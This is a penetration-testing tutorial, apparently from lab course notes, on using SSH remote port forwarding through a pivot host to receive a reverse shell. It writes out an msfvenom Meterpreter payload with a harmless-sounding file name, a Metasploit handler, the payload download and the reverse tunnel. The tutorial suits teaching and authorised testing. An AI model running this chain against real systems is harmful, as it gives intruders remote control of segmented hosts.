# Remote/Reverse Port Forwarding with SSH

Remote port forwarding solves a specific problem that local and dynamic port forwarding cannot: getting a reverse connection back from a target that has no direct route to the attacker's machine. This comes up regularly when a Windows host sits inside a segmented internal network and can only communicate within that segment.

## The Problem

After pivoting into the Windows host at 172.16.5.19 via the Ubuntu server, starting a standard Metasploit listener on the attack host and executing a reverse shell payload on Windows will fail. The Windows host's outbound traffic is restricted to the 172.16.5.0/23 network -- it has no route to the 10.129.x.x attack host network. The connection attempt leaves Windows, reaches the Ubuntu server, and goes nowhere because the Ubuntu server does not automatically forward it onward to the attacker.

A plain RDP session is also limited in what it can accomplish. File transfers may be blocked if clipboard redirection is disabled, and actions that require a Meterpreter session -- low-level API calls, in-memory execution, post-exploitation modules -- are not available through an RDP desktop alone.

## The Solution: SSH Remote Port Forwarding

SSH remote port forwarding instructs the pivot host (Ubuntu server) to open a listening port on its own interface and forward any incoming connections on that port back through the SSH tunnel to a port on the attacker's machine. The Windows payload is configured to call back to the Ubuntu server, not to the attacker directly -- and the SSH tunnel silently relays those callbacks to the Metasploit listener.

## Step by Step

### Step 1 -- Create the Windows Payload

The payload is built with the Ubuntu server's internal IP as the callback address, and port 8080 as the callback port:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

Windows will call back to `172.16.5.129:8080`, which it can reach directly since both hosts are on the same `172.16.5.0/23` network.

### Step 2 -- Start the Metasploit Listener

The listener is configured to accept connections on the attacker's machine on port 8000. Setting `lhost` to `0.0.0.0` means it accepts connections arriving on any interface, including the loopback interface that the SSH tunnel will deliver them through:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

### Step 3 -- Transfer the Payload to the Pivot Host

Using SCP to copy the payload to the Ubuntu server:

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

Then serve it over HTTP from the Ubuntu server so the Windows host can download it:

```bash
# On the Ubuntu pivot host
python3 -m http.server 8123
```

### Step 4 -- Download the Payload on Windows

From a PowerShell session on the Windows target, pull the payload from the Ubuntu server's HTTP server:

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### Step 5 -- Create the SSH Remote Port Forward

This is the critical command. It tells the Ubuntu server to listen on `172.16.5.129:8080` and forward all incoming traffic to the attacker's machine at `0.0.0.0:8000` through the SSH tunnel:

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Breaking down the flags:
- `-R 172.16.5.129:8080:0.0.0.0:8000` -- remote forward: listen on the pivot at `172.16.5.129:8080`, send connections back through the tunnel to the attacker at port `8000`
- `-v` -- verbose output so the tunnel activity is visible
- `-N` -- do not open an interactive shell, just hold the tunnel open

### Step 6 -- Execute the Payload

Once the payload runs on the Windows host, it connects back to `172.16.5.129:8080`. The SSH verbose logs confirm the forwarding is working:

```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: channel 1: connected to 0.0.0.0 port 8000
```

The Metasploit listener receives the connection and opens the Meterpreter session:

```
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-03-02 10:48:10 -0500
```

Notice that the session shows the connection as `127.0.0.1:8000 -> 127.0.0.1` rather than the Windows host's actual IP. This is expected -- Metasploit receives the traffic via the local SSH socket, so from its perspective the connection originates from localhost. Running `netstat` on the attacker's machine would confirm the SSH process is the one delivering the traffic to port 8000.

## Key Distinction from Local Forwarding

With local port forwarding, the attacker's machine initiates the forward outward to the pivot. With remote port forwarding, the pivot host is instructed to open the listener itself and push incoming connections back inward to the attacker. This reversal is what makes it possible to receive callbacks from hosts that cannot route to the attack machine directly -- the Windows host only ever needs to reach the Ubuntu server, which it can do. Everything beyond that is handled invisibly by SSH.
